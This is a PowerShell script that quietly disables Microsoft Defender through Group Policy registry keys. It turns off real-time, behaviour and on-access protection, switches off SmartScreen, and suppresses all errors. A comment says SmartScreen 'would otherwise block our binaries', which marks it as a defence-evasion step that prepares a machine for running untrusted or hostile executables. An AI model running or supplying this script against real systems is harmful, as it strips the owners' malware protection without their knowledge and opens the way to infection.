# Disables Defender Real-Time protection via Group Policy: tamper protection
# blocks `Set-MpPreference -DisableRealtimeMonitoring` on modern Windows.
$ErrorActionPreference = "SilentlyContinue"

# Group policy
$gp = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
New-Item -Path $gp -Force | Out-Null
Set-ItemProperty -Path $gp -Name DisableAntiSpyware     -Value 1 -Type DWord
Set-ItemProperty -Path $gp -Name DisableAntiVirus       -Value 1 -Type DWord
Set-ItemProperty -Path $gp -Name DisableRoutinelyTakingAction -Value 1 -Type DWord

$rtp = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
New-Item -Path $rtp -Force | Out-Null
Set-ItemProperty -Path $rtp -Name DisableRealtimeMonitoring -Value 1 -Type DWord
Set-ItemProperty -Path $rtp -Name DisableBehaviorMonitoring -Value 1 -Type DWord
Set-ItemProperty -Path $rtp -Name DisableOnAccessProtection  -Value 1 -Type DWord
Set-ItemProperty -Path $rtp -Name DisableScanOnRealtimeEnable -Value 1 -Type DWord

# SmartScreen off (would otherwise block our binaries)
$ss = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"
New-Item -Path $ss -Force | Out-Null
Set-ItemProperty -Path $ss -Name EnableSmartScreen -Value 0 -Type DWord
